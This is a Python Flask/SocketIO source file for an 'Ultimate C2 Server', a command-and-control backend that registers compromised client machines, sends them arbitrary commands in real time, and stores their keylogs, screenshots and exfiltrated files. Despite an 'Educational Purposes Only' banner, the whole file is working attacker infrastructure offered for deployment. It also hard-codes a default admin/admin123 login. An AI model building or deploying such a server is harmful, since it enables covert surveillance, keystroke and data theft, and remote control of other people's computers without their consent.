#!/usr/bin/env python3
"""
ULTIMATE C2 SERVER - RENDER DEPLOYMENT
Educational Purposes Only
"""

from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import hashlib
import time
import threading
import os
import json
import base64
import sqlite3
import queue
from datetime import datetime, timedelta
from collections import defaultdict, deque
import logging
import jwt
import secrets
from pathlib import Path
import mimetypes
import zipfile
import io

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Configuration
app.config.update(
    SECRET_KEY=os.environ.get('SECRET_KEY', secrets.token_hex(32)),
    JWT_SECRET=os.environ.get('JWT_SECRET', secrets.token_hex(32)),
    MAX_CONTENT_LENGTH=100 * 1024 * 1024,  # 100MB for Render free tier
    DATABASE='c2_database.db',
    UPLOAD_FOLDER='uploads',
    KEYLOG_FOLDER='keylogs',
    SCREENSHOT_FOLDER='screenshots',
    FILE_STORAGE='file_storage',
    LOG_RETENTION_DAYS=7,  # Reduced for free tier
    SESSION_TIMEOUT=3600,
    RATE_LIMIT=100,
    ADMIN_USERS=['admin'],
    BACKUP_INTERVAL=3600
)

# Create folders
for folder in [app.config['UPLOAD_FOLDER'], app.config['KEYLOG_FOLDER'], 
               app.config['SCREENSHOT_FOLDER'], app.config['FILE_STORAGE']]:
    os.makedirs(folder, exist_ok=True)

# SocketIO - Using eventlet for Render compatibility
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    logger=True,
    engineio_logger=False,
    async_mode='eventlet',
    ping_timeout=60,
    ping_interval=25
)

# Database initialization
def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT UNIQUE,
                  password_hash TEXT,
                  role TEXT DEFAULT 'operator',
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  last_login TIMESTAMP,
                  is_active INTEGER DEFAULT 1)''')
    
    # Clients table
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id TEXT PRIMARY KEY,
                  hostname TEXT,
                  username TEXT,
                  os TEXT,
                  platform TEXT,
                  arch TEXT,
                  ip TEXT,
                  user_id INTEGER,
                  first_seen TIMESTAMP,
                  last_seen TIMESTAMP,
                  online INTEGER DEFAULT 0,
                  battery TEXT,
                  location TEXT,
                  metadata TEXT,
                  tags TEXT,
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    # Commands table
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id TEXT PRIMARY KEY,
                  client_id TEXT,
                  user_id INTEGER,
                  command TEXT,
                  args TEXT,
                  timestamp TIMESTAMP,
                  status TEXT,
                  output TEXT,
                  execution_time REAL,
                  FOREIGN KEY(client_id) REFERENCES clients(id),
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    # Keylogs table
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  window_title TEXT,
                  process_name TEXT,
                  keystrokes TEXT,
                  screenshot BLOB,
                  timestamp TIMESTAMP,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Screenshots table
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  filename TEXT,
                  data BLOB,
                  timestamp TIMESTAMP,
                  size INTEGER,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Files table
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id TEXT PRIMARY KEY,
                  client_id TEXT,
                  filename TEXT,
                  path TEXT,
                  size INTEGER,
                  hash TEXT,
                  timestamp TIMESTAMP,
                  is_downloaded INTEGER DEFAULT 0,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Tasks table
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  task_type TEXT,
                  schedule TEXT,
                  command TEXT,
                  status TEXT,
                  last_run TIMESTAMP,
                  next_run TIMESTAMP,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Alerts table
    c.execute('''CREATE TABLE IF NOT EXISTS alerts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  alert_type TEXT,
                  severity TEXT,
                  message TEXT,
                  data TEXT,
                  timestamp TIMESTAMP,
                  acknowledged INTEGER DEFAULT 0,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Sessions table
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  ip_address TEXT,
                  user_agent TEXT,
                  created_at TIMESTAMP,
                  last_activity TIMESTAMP,
                  expires_at TIMESTAMP,
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    # Create default admin
    c.execute("SELECT COUNT(*) FROM users WHERE username = 'admin'")
    if c.fetchone()[0] == 0:
        password_hash = generate_password_hash('admin123')
        c.execute("INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                 ('admin', password_hash, 'admin'))
    
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_database()

# Memory stores
clients = {}
command_queues = defaultdict(queue.PriorityQueue)
active_sessions = {}
client_sockets = {}
rate_limiters = defaultdict(deque)
client_lock = threading.Lock()

# Authentication decorator
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        if 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            if ' ' in auth_header:
                token = auth_header.split()[1]
        
        if not token:
            return jsonify({'error': 'Token is missing'}), 401
        
        try:
            data = jwt.decode(token, app.config['JWT_SECRET'], algorithms=['HS256'])
            current_user = get_user(data['user_id'])
            if not current_user:
                return jsonify({'error': 'User not found'}), 401
        except Exception as e:
            logger.error(f"Token error: {e}")
            return jsonify({'error': 'Token is invalid'}), 401
        
        return f(current_user, *args, **kwargs)
    return decorated

def get_user(user_id):
    """Get user from database"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        return user
    except Exception as e:
        logger.error(f"Get user error: {e}")
        return None

# Rate limiting
def check_rate_limit(ip, limit=100):
    """Check rate limit for IP"""
    now = time.time()
    window = 60
    
    with client_lock:
        if ip not in rate_limiters:
            rate_limiters[ip] = deque()
        
        while rate_limiters[ip] and rate_limiters[ip][0] < now - window:
            rate_limiters[ip].popleft()
        
        if len(rate_limiters[ip]) >= limit:
            return False
        
        rate_limiters[ip].append(now)
        return True

# Routes
@app.route('/')
def index():
    """Main dashboard"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ultimate C2 Server</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Courier New', monospace; 
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
                color: #00ff00; 
                min-height: 100vh;
                padding: 20px;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { 
                text-align: center; 
                margin-bottom: 40px; 
                padding: 20px;
                background: rgba(0, 255, 0, 0.05);
                border: 2px solid #00ff00;
                border-radius: 10px;
            }
            h1 { font-size: 2em; margin-bottom: 10px; text-shadow: 0 0 10px #00ff00; }
            .subtitle { color: #00cc00; font-size: 1.1em; }
            .stats { 
                display: grid; 
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
                gap: 20px; 
                margin-bottom: 40px; 
            }
            .stat-box { 
                background: rgba(26, 26, 46, 0.8); 
                padding: 20px; 
                border-radius: 10px; 
                text-align: center; 
                border: 1px solid #00ff00;
                transition: all 0.3s;
            }
            .stat-box:hover {
                transform: translateY(-5px);
                box-shadow: 0 5px 20px rgba(0, 255, 0, 0.3);
            }
            .stat-number { 
                font-size: 2.5em; 
                font-weight: bold; 
                color: #00ff00; 
                text-shadow: 0 0 10px #00ff00;
            }
            .stat-label { margin-top: 10px; color: #00cc00; }
            .endpoints { 
                background: rgba(26, 26, 46, 0.8); 
                padding: 25px; 
                border-radius: 10px; 
                border: 1px solid #00ff00;
            }
            .endpoints h3 { 
                margin-bottom: 20px; 
                color: #00ff00;
                font-size: 1.5em;
            }
            .endpoint { 
                padding: 10px; 
                margin: 10px 0;
                background: rgba(0, 255, 0, 0.05);
                border-left: 3px solid #00ff00;
                border-radius: 5px;
            }
            code { 
                background: #0a0a15; 
                padding: 3px 8px; 
                border-radius: 4px;
                color: #00ff00;
            }
            .method { 
                display: inline-block;
                padding: 2px 8px;
                border-radius: 3px;
                font-weight: bold;
                margin-right: 10px;
            }
            .post { background: #ff6b6b; color: white; }
            .get { background: #4ecdc4; color: white; }
            .ws { background: #ffe66d; color: #333; }
            .footer { 
                text-align: center; 
                color: #666; 
                margin-top: 40px;
                padding: 20px;
                border-top: 1px solid #00ff00;
            }
            .status { 
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background: #00ff00;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }
            @media (max-width: 768px) {
                h1 { font-size: 1.5em; }
                .stats { grid-template-columns: repeat(2, 1fr); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛸 ULTIMATE C2 SERVER</h1>
                <p class="subtitle">
                    <span class="status"></span> 
                    Multi-Platform • Real-Time • Scalable
                </p>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number" id="clientsTotal">--</div>
                    <div class="stat-label">Total Clients</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="clientsOnline">--</div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="commandsToday">--</div>
                    <div class="stat-label">Commands Today</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="alertsActive">--</div>
                    <div class="stat-label">Active Alerts</div>
                </div>
            </div>
            
            <div class="endpoints">
                <h3>📡 API ENDPOINTS</h3>
                <div class="endpoint">
                    <span class="method post">POST</span>
                    <code>/api/auth/login</code> - User authentication
                </div>
                <div class="endpoint">
                    <span class="method get">GET</span>
                    <code>/api/clients</code> - List all clients
                </div>
                <div class="endpoint">
                    <span class="method post">POST</span>
                    <code>/api/command</code> - Send command to client
                </div>
                <div class="endpoint">
                    <span class="method get">GET</span>
                    <code>/api/keylogs/{client_id}</code> - Get keylogs
                </div>
                <div class="endpoint">
                    <span class="method post">POST</span>
                    <code>/api/upload</code> - Upload file to client
                </div>
                <div class="endpoint">
                    <span class="method get">GET</span>
                    <code>/api/download/{file_id}</code> - Download file
                </div>
                <div class="endpoint">
                    <span class="method ws">WS</span>
                    <code>/socket.io/</code> - WebSocket real-time connection
                </div>
            </div>
            
            <div class="footer">
                <p>⚠️ Educational Purposes Only • Use Responsibly</p>
                <p style="margin-top: 10px; font-size: 0.9em;">
                    Default credentials: admin / admin123
                </p>
            </div>
        </div>
        
        <script>
            async function updateStats() {
                try {
                    const res = await fetch('/api/stats');
                    const data = await res.json();
                    document.getElementById('clientsTotal').textContent = data.clients_total || 0;
                    document.getElementById('clientsOnline').textContent = data.clients_online || 0;
                    document.getElementById('commandsToday').textContent = data.commands_today || 0;
                    document.getElementById('alertsActive').textContent = data.alerts_active || 0;
                } catch (e) {
                    console.error('Stats error:', e);
                }
            }
            updateStats();
            setInterval(updateStats, 5000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/health')
def health():
    """Health check for Render"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'clients': len(clients)
    })

@app.route('/api/auth/login', methods=['POST'])
def login():
    """User login"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username = ? AND is_active = 1", (username,))
        user = c.fetchone()
        conn.close()
        
        if user and check_password_hash(user[2], password):
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?", (user[0],))
            conn.commit()
            conn.close()
            
            token = jwt.encode({
                'user_id': user[0],
                'username': user[1],
                'role': user[3],
                'exp': datetime.utcnow() + timedelta(hours=24)
            }, app.config['JWT_SECRET'], algorithm='HS256')
            
            session_id = secrets.token_hex(16)
            active_sessions[session_id] = {
                'user_id': user[0],
                'username': user[1],
                'role': user[3],
                'created_at': time.time()
            }
            
            return jsonify({
                'token': token,
                'session_id': session_id,
                'user': {
                    'id': user[0],
                    'username': user[1],
                    'role': user[3]
                }
            })
        
        return jsonify({'error': 'Invalid credentials'}), 401
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'error': 'Login failed'}), 500

@app.route('/api/stats')
def get_stats():
    """Get server statistics"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM clients")
        total_clients = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM clients WHERE online = 1")
        online_clients = c.fetchone()[0]
        
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute("SELECT COUNT(*) FROM commands WHERE date(timestamp) = ?", (today,))
        commands_today = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM alerts WHERE acknowledged = 0")
        alerts_active = c.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'clients_total': total_clients,
            'clients_online': online_clients,
            'commands_today': commands_today,
            'alerts_active': alerts_active,
            'server_time': time.time()
        })
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return jsonify({
            'clients_total': 0,
            'clients_online': 0,
            'commands_today': 0,
            'alerts_active': 0,
            'server_time': time.time()
        })

@app.route('/api/clients')
@token_required
def api_clients(current_user):
    """Get all clients"""
    try:
        with client_lock:
            clients_list = []
            for client_id, client in clients.items():
                if client.get('user_id') == current_user[0] or current_user[3] == 'admin':
                    clients_list.append({
                        'id': client_id,
                        'hostname': client.get('hostname', 'Unknown'),
                        'username': client.get('username', 'Unknown'),
                        'os': client.get('os', 'Unknown'),
                        'platform': client.get('platform', 'unknown'),
                        'online': client.get('online', False),
                        'ip': client.get('ip', 'Unknown'),
                        'last_seen': client.get('last_seen', 0)
                    })
            return jsonify(clients_list)
    except Exception as e:
        logger.error(f"Clients error: {e}")
        return jsonify([])

@app.route('/api/command', methods=['POST'])
@token_required
def api_send_command(current_user):
    """Send command to client"""
    try:
        if not check_rate_limit(request.remote_addr):
            return jsonify({'error': 'Rate limit exceeded'}), 429
        
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        args = data.get('args', {})
        
        if not client_id or not command:
            return jsonify({'error': 'Missing parameters'}), 400
        
        cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
        command_data = {
            'id': cmd_id,
            'type': 'command',
            'command': command,
            'args': args,
            'timestamp': time.time()
        }
        
        if client_id in client_sockets:
            socketio.emit('command', command_data, room=client_sockets[client_id])
            return jsonify({'status': 'sent', 'command_id': cmd_id})
        else:
            return jsonify({'status': 'client_offline', 'command_id': cmd_id}), 404
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'error': 'Command failed'}), 500

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.info(f"WebSocket connected: {request.sid}")
    emit('connected', {'message': 'Connected to C2'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnect"""
    with client_lock:
        for client_id, socket_id in list(client_sockets.items()):
            if socket_id == request.sid:
                if client_id in clients:
                    clients[client_id]['online'] = False
                    clients[client_id]['last_seen'] = time.time()
                del client_sockets[client_id]
                logger.info(f"Client disconnected: {client_id}")
                break

@socketio.on('register')
def handle_register(data):
    """Client registration"""
    try:
        unique = f"{data.get('hostname', '')}{data.get('os', '')}{data.get('username', '')}"
        client_id = data.get('id') or hashlib.sha256(unique.encode()).hexdigest()[:16]
        
        with client_lock:
            clients[client_id] = {
                'hostname': data.get('hostname', 'Unknown'),
                'username': data.get('username', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'platform': data.get('platform', 'unknown'),
                'ip': request.remote_addr,
                'user_id': 1,
                'last_seen': time.time(),
                'online': True
            }
            
            client_sockets[client_id] = request.sid
            join_room(client_id)
            
            logger.info(f"Client registered: {client_id}")
            
            emit('welcome', {
                'client_id': client_id,
                'message': 'Registered',
                'timestamp': time.time()
            })
    except Exception as e:
        logger.error(f"Register error: {e}")
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        with client_lock:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('command_response')
def handle_command_response(data):
    """Handle command response"""
    try:
        logger.info(f"Command response: {data.get('command_id')}")
        emit('response_received', data, broadcast=True)
    except Exception as e:
        logger.error(f"Response error: {e}")

def print_banner():
    """Print startup banner"""
    print("\n" + "="*70)
    print("     ULTIMATE C2 SERVER - RENDER DEPLOYMENT")
    print("     Educational Purposes Only")
    print("="*70)
    print(f"Port: {os.environ.get('PORT', 10000)}")
    print(f"Database: Initialized")
    print(f"Default Login: admin / admin123")
    print("="*70 + "\n")

if __name__ == '__main__':
    print_banner()
    
    port = int(os.environ.get('PORT', 10000))
    
    logger.info(f"Starting server on 0.0.0.0:{port}")
    
    # Use eventlet for Render
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        log_output=True
    )
